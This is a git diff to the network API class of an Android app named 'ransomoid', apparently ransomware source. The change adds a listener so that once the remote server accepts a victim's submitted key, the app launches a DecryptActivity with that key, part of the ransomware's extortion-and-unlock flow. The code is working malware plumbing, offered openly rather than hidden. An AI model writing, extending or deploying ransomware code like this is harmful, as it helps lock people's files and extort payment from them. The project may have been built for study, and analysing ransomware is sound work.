@@ -12,6 +12,7 @@ import com.android.volley.toolbox.Volley;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import falezza.fabio.ransomoid.activities.DecryptActivity;
 import falezza.fabio.ransomoid.activities.EncryptedActivity;
 
 import static com.android.volley.Request.Method.POST;
@@ -76,22 +77,13 @@ public class Api {
         this.queue.add(request);
     }
 
-    public void checkKey(String userID, String key) throws JSONException {
+    public void checkKey(String userID, final String key) throws JSONException {
+
         JSONObject jsonBody = new JSONObject();
         jsonBody.put("key", key);
         jsonBody.put("id", userID);
 
-        Response.Listener listener = new Response.Listener() {
-            @Override
-            public void onResponse(Object response) {
-                if (response instanceof Integer) {
-                    if ((Integer)response == HTTP_SUCCESS) {
-                        // Decrypt
-                        Toast.makeText(ctx, "Time to decrypt", Toast.LENGTH_SHORT).show();
-                    }
-                }
-            }
-        };
+        Response.Listener listener = new CheckKeyResponseListener(key);
 
         Response.ErrorListener errorListener = new Response.ErrorListener() {
             @Override
@@ -105,6 +97,28 @@ public class Api {
                 jsonBody.toString(), listener, errorListener);
 
         this.queue.add(request);
+    }
+
+    private class CheckKeyResponseListener implements Response.Listener {
+
+        private String key;
+
+        CheckKeyResponseListener( String key) {
+            this.key = key;
+        }
+
+        public void onResponse(Object response) {
+            if (response instanceof Integer) {
+                if ((Integer)response == HTTP_SUCCESS) {
+                    // Decrypt
+                    Toast.makeText(ctx, "Time to decrypt", Toast.LENGTH_SHORT).show();
+                    Intent intent = new Intent(ctx, DecryptActivity.class);
+                    intent.putExtra("key", this.key);
+                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+                    ctx.startActivity(intent);
+                }
+            }
+        }
     }
 }
 
